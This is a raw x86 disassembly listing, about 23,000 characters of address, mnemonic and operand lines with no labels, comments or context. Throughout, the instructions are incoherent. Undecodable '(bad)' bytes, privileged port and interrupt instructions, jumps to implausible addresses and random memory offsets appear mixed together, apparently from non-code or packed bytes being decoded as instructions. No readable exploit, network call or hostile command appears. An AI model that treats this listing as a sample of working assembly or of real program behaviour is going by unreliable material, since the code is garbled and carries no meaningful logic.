  430b52:	mov    BYTE PTR [ebx-0x34b20729],cl
  430b58:	mov    edx,ebx
  430b5a:	lock (bad) 
  430b5c:	ror    esi,cl
  430b5e:	push   ebp
  430b5f:	scas   eax,DWORD PTR es:[edi]
  430b60:	mov    ecx,DWORD PTR [ebx+0x7d8cf4d8]
  430b66:	fwait
  430b67:	sub    esi,DWORD PTR [edx]
  430b69:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  430b6f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430b70:	xor    esp,DWORD PTR [ebx]
  430b72:	add    ecx,DWORD PTR [ebp-0x18]
  430b75:	mov    edi,DWORD PTR [ebp-0x8]
  430b78:	mov    bl,cl
  430b7a:	cmp    dl,bl
  430b7c:	jb     0x430b4c
  430b7e:	add    dh,dl
  430b80:	dec    ebp
  430b81:	scas   eax,DWORD PTR es:[edi]
  430b82:	mov    ecx,DWORD PTR [ebx+0x7dcbf4f0]
  430b88:	shr    DWORD PTR [ebx],cl
  430b8a:	into   
  430b8b:	cmp    edx,esi
  430b8d:	mov    ebp,DWORD PTR [edi-0x17fcfc48]
  430b93:	dec    ebp
  430b94:	dec    ebp
  430b95:	mov    ecx,DWORD PTR [ebx+0x55d3f0f8]
  430b9b:	retf   
  430b9c:	xor    edx,esi
  430b9e:	add    ecx,esi
  430ba0:	imul   ecx,edx
  430ba3:	mov    DWORD PTR [ebp+0x8],edx
  430ba6:	xor    ecx,DWORD PTR [ebp+0x2b]
  430ba9:	mov    DWORD PTR [ebx+0x7d4df0e0],ecx
  430baf:	add    esi,DWORD PTR [ebx]
  430bb1:	rol    BYTE PTR [ebx],0x45
  430bb4:	rdtsc  
  430bb6:	xlat   BYTE PTR ds:[ebx]
  430bb7:	pushf  
  430bb8:	jge    0x430b43
  430bba:	xor    ebx,eax
  430bbc:	sub    eax,DWORD PTR [ebp-0x73]
  430bbf:	(bad)  
  430bc0:	cmp    dh,BYTE PTR [edx+esi*2-0x2e07ff7b]
  430bc7:	dec    ebp
  430bc8:	xchg   BYTE PTR [ebx],dh
  430bca:	inc    DWORD PTR [ebx]
  430bcc:	(bad)  
  430bcd:	jmp    0x430c1c
  430bcf:	mov    ecx,DWORD PTR [ebx-0x34341f1c]
  430bd5:	dec    ebp
  430bd6:	into   
  430bd7:	mov    ebp,DWORD PTR [edi-0x1b737428]
  430bdd:	fwait
  430bde:	shl    DWORD PTR [edx],cl
  430be0:	retf   0x5588
  430be3:	or     ecx,DWORD PTR [ebp+0x7233114d]
  430be9:	add    eax,DWORD PTR [eax]
  430beb:	call   0x8ace613d
  430bf0:	fcom   QWORD PTR [ecx]
  430bf2:	retf   
  430bf3:	jb     0x430c5a
  430bf5:	add    ch,cl
  430bf7:	dec    ebp
  430bf8:	sub    ecx,DWORD PTR [edx+0x55ec0b03]
  430bfe:	dec    ebp
  430bff:	xor    ecx,DWORD PTR [ebx-0x34170bfd]
  430c05:	jge    0x430bd5
  430c07:	mov    BYTE PTR [edi+0xf723b3a],ch
  430c0d:	add    cl,dh
  430c0f:	dec    ebp
  430c10:	dec    DWORD PTR [ebx-0x2c031b01]
  430c16:	inc    ebp
  430c17:	push   ebp
  430c18:	dec    DWORD PTR [ebx-0x73ff2734]
  430c1e:	lea    ebx,[ebx-0x7400cdac]
  430c24:	push   eax
  430c25:	mov    ah,0x45
  430c27:	push   ebp
  430c28:	mov    esi,DWORD PTR [ebx]
  430c2a:	les    esi,FWORD PTR [ebx]
  430c2c:	add    BYTE PTR [ebx],al
  430c2e:	inc    DWORD PTR [ebx]
  430c30:	mov    ecx,DWORD PTR [edi]
  430c32:	cld    
  430c33:	retf   0x4d80
  430c36:	add    DWORD PTR [ecx+0x4d30e800],ecx
  430c3c:	jne    0x430bc9
  430c3e:	jmp    eax
  430c40:	ror    bl,1
  430c42:	or     cl,dh
  430c44:	add    BYTE PTR [edi-0xf2f7475],ch
  430c4a:	not    bl
  430c4c:	adc    al,0xca
  430c4e:	inc    ebp
  430c4f:	push   ebp
  430c50:	mov    ecx,DWORD PTR [ebx-0x2cff1728]
  430c56:	push   0xaf80d6
  430c5b:	mov    eax,DWORD PTR [eax]
  430c5d:	in     al,0xff
  430c5f:	sti    
  430c60:	sbb    dh,cl
  430c62:	pop    esi
  430c63:	xchg   esp,eax
  430c64:	leave  
  430c65:	fwait
  430c66:	add    al,0x32
  430c68:	push   ebp
  430c69:	cmp    ebp,esp
  430c6b:	sqrtps xmm3,XMMWORD PTR [esi+0x4d]
  430c6f:	dec    DWORD PTR [ecx-0x740f0375]
  430c75:	push   ebp
  430c76:	cld    
  430c77:	xor    ebp,ebx
  430c79:	add    ecx,DWORD PTR [ebx-0x743576f1]
  430c7f:	push   ebp
  430c80:	clc    
  430c81:	xor    esi,ecx
  430c83:	add    esi,DWORD PTR [ebp-0x75]
  430c86:	(bad)  
  430c87:	hlt    
  430c88:	or     DWORD PTR [esi+eax*8-0x39cdf865],ecx
  430c8f:	mov    DWORD PTR [esi],eax
  430c91:	hlt    
  430c92:	(bad)  
  430c93:	dec    ebp
  430c94:	add    esi,DWORD PTR [ebx]
  430c96:	(bad)  
  430c97:	mov    edx,0xffc68d0a
  430c9c:	add    dl,cl
  430c9e:	leave  
  430c9f:	push   ebp
  430ca0:	push   ebp
  430ca1:	mov    ebp,esp
  430ca3:	fcom   QWORD PTR [ecx+0x7d]
  430ca6:	inc    ebp
  430ca7:	xor    ecx,DWORD PTR [ecx-0x74f003fd]
  430cad:	iret   
  430cae:	cld    
  430caf:	retf   0x868f
  430cb2:	loopne 0x430cb1
  430cb4:	mov    edi,edi
  430cb6:	mov    esi,DWORD PTR [ebp-0x8]
  430cb9:	mov    esi,eax
  430cbb:	cld    
  430cbc:	jne    0x430c6e
  430cbe:	mov    BYTE PTR [ecx],0xa
  430cc1:	add    dh,al
  430cc3:	test   DWORD PTR [eax],ecx
  430cc5:	inc    esi
  430cc7:	inc    DWORD PTR [edi]
  430cc9:	mov    eax,esi
  430ccb:	cld    
  430ccc:	add    DWORD PTR [eax+0x901c6],eax
  430cd2:	leave  
  430cd3:	xor    BYTE PTR [ebp+0x45],dl
  430cd6:	in     al,dx
  430cd7:	mov    edx,DWORD PTR [ecx-0x40]
  430cda:	inc    ebp
  430cdb:	add    BYTE PTR [ecx-0x74000301],cl
  430ce1:	int3   
  430ce2:	cld    
  430ce3:	jne    0x430c9d
  430ce5:	call   0xcc1ff0
  430cea:	mov    esi,DWORD PTR [ebp-0x8]
  430ced:	test   eax,esi
  430cef:	je     0x430d66
  430cf1:	mov    eax,esi
  430cf3:	cld    
  430cf4:	add    al,0x80
  430cf6:	add    WORD PTR [ecx+0x0],ax
  430cfa:	fiadd  DWORD PTR [eax]
  430cfc:	mov    BYTE PTR [eax],0x3d
  430cff:	push   0xffffffc3
  430d01:	push   esi
  430d02:	mov    edx,DWORD PTR [eax+0x51]
  430d05:	pop    edi
  430d06:	lea    ebx,[ebx-0x8]
  430d09:	ret    0x45
  430d0c:	mov    ecx,DWORD PTR [ebx-0x7240ae04]
  430d12:	xchg   eax,edi
  430d14:	mov    DWORD PTR [ebp-0x75],ecx
  430d17:	push   esi
  430d18:	clc    
  430d19:	jne    0x430ceb
  430d1b:	mov    ecx,0xf8450b0b
  430d20:	(bad)  
  430d21:	push   cs
  430d22:	or     BYTE PTR [ebp-0x3a],dh
  430d25:	cmp    eax,DWORD PTR [ecx]
  430d27:	pop    esi
  430d28:	(bad)  
  430d29:	or     al,0x5
  430d2b:	inc    eax
  430d2c:	leave  
  430d2d:	jmp    0x40cf:0x25564204
  430d34:	leave  
  430d35:	in     eax,dx
  430d36:	inc    DWORD PTR [eax-0x75]
  430d39:	fimul  DWORD PTR [ebx-0x228139be]
  430d3f:	inc    eax
  430d40:	nop
  430d41:	loopne 0x430d42
  430d43:	ret    
  430d44:	mov    ecx,DWORD PTR [ebx-0x7239ae75]
  430d4a:	add    eax,0xff45e8f8
  430d4f:	push   esi
  430d50:	push   DWORD PTR [ebp-0x39]
  430d53:	mov    eax,0x7edda46
  430d58:	or     al,0x6
  430d5a:	push   DWORD PTR [ebp-0x3a]
  430d5d:	cmp    eax,DWORD PTR [edx]
  430d5f:	pop    esi
  430d60:	ret    
  430d61:	or     al,0x56
  430d63:	inc    ecx
  430d64:	push   ebp
  430d65:	jle    0x430d53
  430d67:	inc    edx
  430d68:	inc    ebp
  430d69:	int    0x1
  430d6b:	inc    ecx
  430d6c:	sub    BYTE PTR ds:0xe77541fc,ah
  430d72:	add    DWORD PTR [edx+0x1c],eax
  430d75:	retf   0xc38b
  430d78:	adc    al,0x8b
  430d7a:	xchg   edx,eax
  430d7b:	push   ecx
  430d7c:	mov    cl,BYTE PTR [ebp+0x45c8f8fe]
  430d82:	rcl    DWORD PTR [esi-0x9],cl
  430d85:	jne    0x430dd7
  430d87:	mov    eax,0x7c80ece
  430d8c:	rol    DWORD PTR [esi],cl
  430d8e:	div    DWORD PTR [ebp+0x50]
  430d91:	cmp    ecx,edx
  430d93:	pop    esi
  430d94:	dec    BYTE PTR [edx]
  430d96:	in     al,dx
  430d97:	inc    edx
  430d98:	sub    esp,ecx
  430d9a:	inc    eax
  430d9b:	(bad)  
  430d9c:	push   eax
  430d9d:	add    edx,DWORD PTR [eax-0x1f]
  430da0:	push   edi
  430da1:	add    dh,dh
  430da3:	leave  
  430da4:	adc    DWORD PTR [ebp-0x1],0xffffffec
  430da8:	add    BYTE PTR [ecx+0x0],dl
  430dab:	inc    ebp
  430dac:	ror    DWORD PTR [ecx+0x5536fc8d],cl
  430db2:	add    BYTE PTR [eax-0x7fbf448],bh
  430db8:	add    al,0x2
  430dba:	jmp    0x57eb914
  430dbf:	jne    0x430da9
  430dc1:	mov    eax,DWORD PTR [edx]
  430dc3:	or     BYTE PTR [eax],al
  430dc5:	inc    ecx
  430dc6:	stc    
  430dc7:	in     eax,dx
  430dc8:	ss inc eax
  430dca:	aas    
  430dcb:	out    0x7d,eax
  430dcd:	inc    ecx
  430dce:	mov    ebp,ecx
  430dd0:	lock ret 0x7d
  430dd4:	and    ecx,DWORD PTR [ebx-0x171777]
  430dda:	add    bh,bh
  430ddc:	aad    0xd7
  430dde:	add    dh,cl
  430de0:	clts   
  430de2:	(bad)  
  430de3:	call   0xffce0ce8
  430de8:	hlt    
  430de9:	iret   
  430dea:	jge    0x430dc2
  430dec:	rol    DWORD PTR [esi-0x80],cl
  430def:	jmp    0x1c5cfc
  430df4:	out    dx,al
  430df5:	mov    eax,DWORD PTR [ebx]
  430df7:	(bad)  
  430df8:	pop    esi
  430df9:	push   es
  430dfa:	cmp    al,0xe8
  430dfc:	sar    edi,0x8
  430dff:	inc    DWORD PTR [edi]
  430e01:	inc    esi
  430e02:	(bad)  
  430e03:	loopne 0x430e83
  430e05:	push   edi
  430e06:	push   cs
  430e07:	push   ebx
  430e08:	add    BYTE PTR [ebx+0x24008b56],cl
  430e0e:	add    BYTE PTR [ebp+0x50],al
  430e11:	push   eax
  430e12:	add    DWORD PTR [ebx+0x757d1834],ecx
  430e18:	sub    edx,DWORD PTR [esi-0x24]
  430e1b:	jne    0x430dd3
  430e1d:	lods   eax,DWORD PTR ds:[esi]
  430e1e:	mov    edx,DWORD PTR [edx-0x34]
  430e21:	dec    esi
  430e22:	out    0x83,eax
  430e24:	into   
  430e25:	push   edi
  430e27:	loopne 0x430df7
  430e29:	shr    BYTE PTR [edx+ecx*4+0x0],1
  430e2d:	and    DWORD PTR [edx-0x741fff01],0xffffffd0
  430e34:	rol    DWORD PTR [edx],0x8
  430e37:	mov    esp,ecx
  430e39:	cmp    DWORD PTR [ebx],0xc
  430e3c:	mov    esi,0x5001c0
  430e41:	push   eax
  430e42:	push   cs
  430e43:	push   eax
  430e44:	(bad)  
  430e45:	sub    edx,edi
  430e47:	push   esi
  430e48:	adc    al,0xcb
  430e4a:	ins    DWORD PTR es:[edi],dx
  430e4b:	mov    eax,0x203e8
  430e50:	add    al,ah
  430e52:	ror    BYTE PTR [eax+0xc007c0],0xc0
  430e59:	add    dh,al
  430e5b:	add    ah,ch
  430e5d:	rol    DWORD PTR [ebx-0x3595fb0d],1
  430e63:	pop    ecx
  430e64:	or     eax,ebx
  430e66:	cli    
  430e67:	add    BYTE PTR [ecx-0x4e728d1e],dh
  430e6d:	lea    ebp,[ebx]
  430e6f:	mov    edx,DWORD PTR [edx-0x4]
  430e72:	dec    ecx
  430e73:	inc    ebp
  430e74:	shr    BYTE PTR [ebx],0x4b
  430e77:	and    al,0x0
  430e79:	(bad)  
  430e7a:	jne    0x430ec1
  430e7c:	pop    eax
  430e7d:	mov    al,0x5a
  430e7f:	call   0x14210de
  430e84:	and    al,0x85
  430e86:	push   edx
  430e87:	add    BYTE PTR [eax+eax*1+0x0],ah
  430e8b:	dec    ebp
  430e8c:	mov    cl,0x23
  430e8e:	jmp    0x430e7c
  430e90:	mov    al,0xe7
  430e92:	call   0x1391180
  430e97:	shr    DWORD PTR [eax+ebx*2],cl
  430e9a:	lock (bad) 
  430e9c:	adc    eax,0x757f008d
  430ea1:	out    0x58,eax
  430ea3:	cmp    al,0x7
  430ea5:	pop    edx
  430ea6:	or     DWORD PTR [edx+eax*1-0x74fff494],ecx
  430ead:	push   ecx
  430eae:	cld    
  430eaf:	mov    esi,0x3b0175
  430eb4:	and    al,0xb0
  430eb6:	xor    BYTE PTR [edx+0x1],0x8b
  430eba:	add    ah,bh
  430ebc:	mov    edi,DWORD PTR [ebp-0x4]
  430ebf:	psubsw mm7,QWORD PTR [edi]
  430ec2:	add    DWORD PTR [ebp+0x0],ebp
  430ec5:	rcr    eax,1
  430ec7:	mov    edi,ecx
  430ec9:	and    eax,DWORD PTR [eax]
  430ecb:	add    ecx,DWORD PTR [ebx+0x1b4dd88d]
  430ed1:	call   0x13011ba
  430ed6:	add    al,cl
  430ed8:	mov    ebp,esi
  430eda:	aam    0x83
  430edc:	or     DWORD PTR [ecx],eax
  430ede:	jne    0x430ed1
  430ee0:	mov    eax,DWORD PTR [eax]
  430ee2:	aam    0x0
  430ee4:	dec    ebp
  430ee5:	jne    0x430e72
  430ee7:	cmp    ebx,eax
  430ee9:	jb     0x430f38
  430eeb:	jmp    0x430e78
  430eed:	mov    ebx,esp
  430eef:	int3   
  430ef0:	dec    ebp
  430ef1:	or     DWORD PTR [ecx+0x5f8bdc00],0xffffff8b
  430ef8:	mov    edx,0x8b0a8b
  430efd:	cmp    ecx,DWORD PTR [eax]
  430eff:	jb     0x430ed8
  430f01:	pop    edx
  430f02:	push   edi
  430f03:	cli    
  430f04:	pop    es
  430f05:	mov    eax,ecx
  430f07:	jb     0x430f0b
  430f09:	add    DWORD PTR [ebx],0xa
  430f0c:	mov    eax,DWORD PTR [ebx]
  430f0e:	int3   
  430f0f:	add    bh,BYTE PTR [esi+0x75d10006]
  430f15:	jmp    0x430ea2
  430f17:	mov    al,0xe8
  430f19:	call   0x104119b
  430f1e:	add    edx,DWORD PTR [ecx+ecx*8]
  430f21:	pop    edi
  430f22:	or     BYTE PTR [ecx-0x73],bl
  430f25:	pop    ecx
  430f26:	inc    edi
  430f27:	xor    al,0xeb
  430f29:	push   ecx
  430f2a:	mov    edi,DWORD PTR [edx+0xc506cc]
  430f30:	call   0xb21035
  430f35:	int3   
  430f36:	sbb    BYTE PTR [esi],ch
  430f38:	inc    ebp
  430f39:	add    BYTE PTR [ebx-0x1f4f338b],cl
  430f3f:	call   0x9c11ae
  430f44:	or     BYTE PTR [ebx-0x73],dl
  430f47:	cmp    al,0x47
  430f49:	mov    al,0x1
  430f4b:	jb     0x430f4d
  430f4d:	mov    al,0x10
  430f4f:	push   eax
  430f50:	add    al,0x75
  430f52:	add    BYTE PTR [ebx],ch
  430f54:	add    ebx,esp
  430f56:	int3   
  430f57:	jne    0x430f69
  430f59:	movsx  edx,cl
  430f5c:	add    DWORD PTR [eax],eax
  430f5e:	add    BYTE PTR [ebp+ecx*2+0x40aa2b7d],ch
  430f65:	mov    gs,edi
  430f67:	add    BYTE PTR [eax-0x50],ch
  430f6a:	add    al,ch
  430f6c:	mov    eax,DWORD PTR [ecx]
  430f6e:	sub    eax,DWORD PTR [eax]
  430f70:	jb     0x430fe7
  430f72:	add    DWORD PTR [esp+eiz*8-0x50],esi
  430f76:	jge    0x430f60
  430f78:	add    al,0x1
  430f7a:	add    DWORD PTR [eax],0x0
  430f7d:	jne    0x430f7f
  430f7f:	je     0x430fc6
  430f81:	mov    eax,DWORD PTR [edi]
  430f83:	ror    BYTE PTR [ebp+0x4d],1
  430f86:	or     DWORD PTR [ecx+0x4d03d004],0x3
  430f8d:	mov    DWORD PTR [ebx-0x1eb2372c],ecx
  430f93:	mov    DWORD PTR [ebx],ebp
  430f95:	fadd   DWORD PTR [eax+0x75]
  430f98:	inc    eax
  430f99:	pop    eax
  430f9a:	lea    ebx,[ecx+0x4f]
  430f9d:	push   0xb1000003
  430fa2:	out    dx,eax
  430fa3:	add    ebp,DWORD PTR [edx+edx*2]
  430fa6:	add    BYTE PTR [ebx+ecx*4],bh
  430fa9:	mov    ch,BYTE PTR [ebx]
  430fab:	jb     0x43101f
  430fad:	add    al,0x89
  430faf:	push   eax
  430fb0:	call   0x842b5d22
  430fb5:	add    DWORD PTR [eax+eax*1],eax
  430fb8:	jae    0x430fce
  430fba:	icebp  
  430fbb:	inc    ebp
  430fbc:	mov    eax,DWORD PTR gs:[ecx]
  430fbf:	int3   
  430fc0:	out    dx,al
  430fc1:	loopne 0x431010
  430fc3:	sub    eax,DWORD PTR [edx]
  430fc5:	push   0xffffff83
  430fc7:	pop    esi
  430fc8:	push   cs
  430fc9:	jl     0x430fe4
  430fcb:	add    al,0xaf
  430fcd:	xor    eax,0x832b6d00
  430fd2:	mov    eax,DWORD PTR [edx]
  430fd4:	rcr    BYTE PTR [ebp+0x754500dc],cl
  430fda:	ror    DWORD PTR [ebx+0x7dc8e803],1
  430fe0:	inc    ebp
  430fe1:	shr    ebx,0x3
  430fe4:	or     DWORD PTR [eax],0x4
  430fe7:	push   0xffffffa5
  430fe9:	pop    esi
  430fea:	add    BYTE PTR [ecx+edx*8-0x23ff2efc],bh
  430ff1:	jmp    0x431050
  430ff3:	mov    edi,0xff0272
  430ff8:	fdivr  QWORD PTR [ebp+0x5d]
  430ffb:	push   0x4e
  430ffd:	pop    ecx
  430ffe:	call   0x435403
  431003:	mov    DWORD PTR [ebx],eax
  431005:	in     al,0xc8
  431007:	rol    BYTE PTR [ebp-0x75],0xc1
  43100b:	call   0xad11ec
  431010:	pop    esi
  431011:	enter  0xceff,0x8b
  431015:	repz mov ecx,DWORD PTR [ebp-0x34]
  431019:	xor    DWORD PTR [esi-0x57f0ff3c],0xffffffb0
  431020:	je     0x431022
  431022:	or     DWORD PTR [ebx-0x74183b24],eax
  431028:	jne    0x43100e
  43102a:	jmp    0x431025
  43102c:	push   DWORD PTR [edx-0x24]
  43102f:	push   0x4d
  431031:	pop    ecx
  431032:	cmp    DWORD PTR [ebp+0x2],0xffffffc1
  431036:	jge    0x43103e
  431038:	mov    eax,eax
  43103a:	sub    ebp,DWORD PTR [edx+0x24]
  43103d:	pop    esi
  43103e:	inc    ebp
  43103f:	mov    esp,0x8b6077
  431044:	sub    ecx,DWORD PTR [ebx+0x155e8dc]
  43104a:	lods   al,BYTE PTR ds:[esi]
  43104b:	add    BYTE PTR [ebx],bh
  43104d:	enter  0xce73,0x49
  431051:	repz test DWORD PTR [ebp+0x7d],0xf0dc0f89
  431059:	stc    
  43105a:	jge    0x4310ce
  43105c:	jnp    0xdd4293cb
  431062:	call   0xc61138
  431067:	fadd   st(0),st
  431069:	dec    esi
  43106a:	ins    BYTE PTR es:[edi],dx
  43106b:	stc    
  43106c:	cmp    al,0x73
  43106e:	push   ebp
  43106f:	mov    eax,0xf8028b
  431074:	jne    0x431037
  431076:	mov    esi,ecx
  431078:	mov    esp,DWORD PTR [ebp+0x2c]
  43107b:	add    edi,DWORD PTR [ebp-0x24]
  43107e:	sub    esp,eax
  431080:	and    al,0x45
  431082:	cmp    cl,BYTE PTR [ecx+0x2d5fcc5b]
  431088:	sbb    al,0xee
  43108a:	pop    esi
  43108b:	call   0x8310bb
  431090:	fsubr  st,st(3)
  431092:	sti    
  431093:	add    BYTE PTR gs:[ecx],bh
  431096:	add    eax,esp
  431098:	add    DWORD PTR [esi],eax
  43109a:	rol    DWORD PTR [ebp+0x8],0x29
  43109e:	mov    esp,eax
  4310a0:	clc    
  4310a1:	jne    0x431118
  4310a3:	mov    eax,0x8b0673
  4310a8:	loopne 0x4310ef
  4310aa:	loopne 0x431035
  4310ac:	lods   al,BYTE PTR ds:[esi]
  4310ad:	int3   
  4310ae:	inc    ebp
  4310af:	mov    DWORD PTR gs:[eax+edi*8],eax
  4310b3:	add    al,0xc3
  4310b5:	sub    ecx,DWORD PTR [ebp+0x47]
  4310b8:	(bad)  
  4310ba:	shr    BYTE PTR [ebp-0x1f],0xe8
  4310be:	add    eax,DWORD PTR [eax]
  4310c0:	call   0x644d1c5
  4310c5:	add    esi,DWORD PTR [esi-0x3b2efc83]
  4310cb:	dec    esi
  4310cc:	ins    DWORD PTR es:[edi],dx
  4310cd:	in     al,dx
  4310ce:	lea    eax,[eax]
  4310d0:	inc    ebp
  4310d1:	inc    ebp
  4310d2:	sub    ecx,DWORD PTR [ebx-0x3eba1b73]
  4310d8:	or     DWORD PTR [ebx-0x38ff0400],0x398b4573
  4310e2:	and    al,0xdc
  4310e4:	ror    DWORD PTR [edx+0x24],0xf7
  4310e8:	or     BYTE PTR [ebp+0x4c],dh
  4310eb:	mov    ebx,DWORD PTR [eax+ebp*1-0x64]
  4310ef:	stos   BYTE PTR es:[edi],al
  4310f0:	adc    edx,edi
  4310f2:	inc    esp
  4310f3:	add    edi,DWORD PTR [eax]
  4310f5:	jne    0x4310da
  4310f7:	mov    DWORD PTR [eax-0x7449db04],ecx
  4310fd:	cmp    ecx,DWORD PTR [edi]
  4310ff:	sub    BYTE PTR [ebp-0x7e],dl
  431102:	sar    ebp,0xb
  431105:	jmp    FWORD PTR [edi+0x2400392a]
  43110b:	sub    esi,DWORD PTR [ebx-0x73]
  43110e:	mov    esp,DWORD PTR [ecx+edi*4]
  431111:	mov    ecx,DWORD PTR [eax]
  431113:	and    BYTE PTR [eax],al
  431115:	jne    0x4310e1
  431117:	sub    ebp,ecx
  431119:	sbb    BYTE PTR [esi+0x32],ah
  43111c:	dec    ebp
  43111d:	push   ebp
  43111e:	add    ecx,DWORD PTR [ebx+0x7d24fc8d]
  431124:	ret    
  431125:	mov    edx,ebp
  431127:	leave  
  431128:	sub    DWORD PTR [esi+0x24],ebx
  43112b:	ret    0x2b
  43112e:	pop    ax
  431130:	push   ebp
  431131:	rol    BYTE PTR [ebx],0xeb
  431134:	add    DWORD PTR [ecx+0x6c0001],0x40
  43113b:	jb     0x431192
  43113d:	ret    
  43113e:	in     al,dx
  43113f:	jecxz  0x4310cc
  431141:	push   esi
  431142:	xchg   esp,eax
  431143:	jne    0x431145
  431145:	cmp    edx,DWORD PTR [esi+0x1c]
  431148:	jne    0x43112e
  43114a:	mov    eax,DWORD PTR [ebp-0x77]
  43114d:	ror    DWORD PTR [ebx+0x899408],0xe0
  431154:	mov    esi,DWORD PTR [ebp-0x75]
  431157:	pop    esi
  431158:	nop
  431159:	mov    eax,DWORD PTR [eax]
  43115b:	les    ecx,FWORD PTR [ecx-0x6b3e744a]
  431161:	add    al,0x0
  431163:	inc    ebp
  431164:	mov    eax,DWORD PTR [ebx]
  431166:	mov    ebp,ebx
  431168:	cmp    al,0xf
  43116a:	or     al,al
  43116c:	inc    ebp
  43116d:	inc    ebp
  43116e:	xor    DWORD PTR [ebx+0x6c8bc89c],ecx
  431174:	cld    
  431175:	add    BYTE PTR [edi+0x546c16c0],dh
  43117b:	add    BYTE PTR [ecx-0x5],dl
  43117e:	add    eax,0x17200
  431183:	sbb    al,0x85
  431185:	dec    esp
  431186:	je     0x4311c0
  431188:	mov    esp,DWORD PTR [eax+ecx*8+0x20]
  43118c:	add    BYTE PTR [ebx],bh
  43118e:	(bad)  
  43118f:	and    al,0x32
  431191:	jae    0x43112f
  431193:	mov    cl,cl
  431195:	inc    DWORD PTR [esp]
  431198:	push   ebp
  431199:	shr    esp,0x8
  43119c:	in     al,dx
  43119d:	push   esp
  43119e:	add    DWORD PTR [eax],esp
  4311a0:	add    bl,cl
  4311a2:	inc    ebp
  4311a3:	mov    bh,0x89
  4311a5:	add    ah,bh
  4311a7:	jmp    0xca7520f1
  4311ac:	pushf  
  4311ad:	dec    esp
  4311ae:	mov    edx,0xf8178520
  4311b3:	fst    DWORD PTR [ebp+0x0]
  4311b6:	mov    BYTE PTR [eax],0xc4
  4311b9:	sub    edx,DWORD PTR [ebx-0x3f]
  4311bc:	inc    ebp
  4311bd:	add    eax,0xc601da
  4311c2:	mov    al,0xc6
  4311c5:	ins    BYTE PTR es:[edi],dx
  4311c6:	mov    DWORD PTR [eax+0x57],0x2c0545c1
  4311cd:	dec    esp
  4311ce:	jmp    DWORD PTR [eax]
  4311d0:	inc    ebp
  4311d1:	fnstcw WORD PTR [esi+0x29]
  4311d4:	test   BYTE PTR [eax],0xc8
  4311d7:	rol    BYTE PTR [eax],0xc0
  4311da:	lea    ecx,[ebp-0x3cf0dbcb]
  4311e0:	sbb    BYTE PTR [ebx-0x75fcae0d],cl
  4311e6:	inc    esi
  4311e7:	add    DWORD PTR [eax],ebx
  4311e9:	add    dh,bh
  4311eb:	mov    esi,DWORD PTR [edx+0x8]
  4311ee:	(bad)  
  4311ef:	fdiv   QWORD PTR ss:[ecx]
  4311f2:	(bad)  
  4311f3:	mov    bl,ch
  4311f5:	add    esi,eax
  4311f7:	add    dh,bl
  4311f9:	or     esi,eax
  4311fb:	mov    dl,0xdf
  4311fd:	add    esi,eax
  4311ff:	add    al,ah
  431201:	push   cs
  431202:	mov    BYTE PTR [edx+0xc601e1],0xe2
  431209:	or     BYTE PTR [ebx],dh
  43120b:	dec    ecx
  43120c:	lea    eax,[ebx]
  43120e:	xor    eax,0x18fc0fc7
  431213:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  431214:	repz clc 
  431216:	add    eax,DWORD PTR [ebp+0x46]
  431219:	prefetcht0 BYTE PTR [ecx-0x2]
  43121d:	xor    eax,0x7c60872
  431222:	mov    esp,0xbd32c69b
  431227:	pop    esi
  431228:	mov    cl,0xbe
  43122b:	or     al,0xc6
  43122d:	cmp    BYTE PTR [edi-0x3fff39ff],0x0
  431234:	mov    BYTE PTR [ebp-0x3d39073f],0xc2
  43123b:	add    dh,al
  43123d:	mov    eax,ebx
  43123f:	xor    DWORD PTR [ebx],0x35008dbc
  431245:	mov    ecx,DWORD PTR [edi]
  431247:	sbb    al,0x18
  431249:	inc    ebp
  43124a:	xrelease mov DWORD PTR [ebx],0x188546f4
  431251:	clc    
  431252:	(bad)  
  431253:	xor    DWORD PTR [edx-0x64],esi
  431256:	lea    ecx,[ecx+0x45ffe838]
  43125c:	mov    ecx,ebx
  43125e:	fadd   st,st(6)
  431260:	dec    ebp
  431261:	lds    edi,FWORD PTR [eax+0x7145fc56]
  431267:	out    0x1,eax
  431269:	inc    ebp
  43126a:	lea    ebp,ds:0xc8ffc6ff
  431270:	enter  0xa33,0xc6
  431274:	push   ebp
  431275:	leave  
  431276:	(bad)  
  431277:	xor    edi,DWORD PTR [eax-0x7ff7a47]
  43127d:	add    BYTE PTR [ebp+0x44],al
  431280:	mov    eax,esp
  431282:	mov    WORD PTR [esi+0x46398300],?
  431288:	psubusw mm4,QWORD PTR [esi-0x78]
  43128c:	add    BYTE PTR [ebx-0x1303f975],al
  431292:	add    BYTE PTR [ebp+0x1],0xeb
  431296:	add    BYTE PTR [ebp+0x38],al
  431299:	in     eax,dx
  43129a:	inc    ebp
  43129b:	inc    ebp
  43129c:	mov    ebx,ebx
  43129e:	add    BYTE PTR [ebp+0x0],0xec
  4312a2:	mov    DWORD PTR [ebp-0x41],eax
  4312a5:	sub    eax,0x2c00454e
  4312aa:	ins    DWORD PTR es:[edi],dx
  4312ab:	inc    ebp
  4312ac:	add    BYTE PTR [esi+0x66],bh
  4312af:	test   BYTE PTR [ebp-0x2300bc],0xb6
  4312b6:	mov    DWORD PTR [ebx-0x2699b977],0x83b888ff
  4312c0:	dec    edi
  4312c1:	pop    es
  4312c2:	add    ah,ch
  4312c4:	mov    DWORD PTR [ebp+0x68],eax
  4312c7:	in     eax,dx
  4312c8:	inc    DWORD PTR [ebp-0x7d]
  4312cb:	out    0xc0,al
  4312cd:	inc    ebp
  4312ce:	mov    edx,esp
  4312d0:	push   0x45
  4312d2:	(bad)  
  4312d3:	jmp    0xdf925890
  4312d8:	add    BYTE PTR [ebp-0x77],al
  4312db:	out    dx,al
  4312dc:	ins    BYTE PTR es:[edi],dx
  4312dd:	inc    ebp
  4312de:	jmp    edi
  4312e0:	add    DWORD PTR [ebp-0x14],0x7e
  4312e4:	mov    esi,esi
  4312e6:	outs   dx,BYTE PTR ds:[esi]
  4312e7:	inc    esp
  4312e8:	(bad)  
  4312e9:	mov    esp,0x8341b68d
  4312ee:	mov    DWORD PTR [esi+0x70],eax
  4312f1:	fcos   
  4312f3:	mov    BYTE PTR [ebx-0x76f7ca7d],al
  4312f9:	in     al,dx
  4312fa:	jb     0x431281
  4312fc:	(bad)  
  4312fd:	dec    DWORD PTR [ebx-0x7aba9901]
  431303:	mov    edi,edi
  431305:	fdivr  st,st(7)
  431307:	out    dx,eax
  431308:	rcl    BYTE PTR [ebx],0x66
  43130b:	mov    DWORD PTR [ebp-0xc70075],eax
  431311:	(bad)  
  431312:	std    
  431313:	cmp    eax,DWORD PTR [eax]
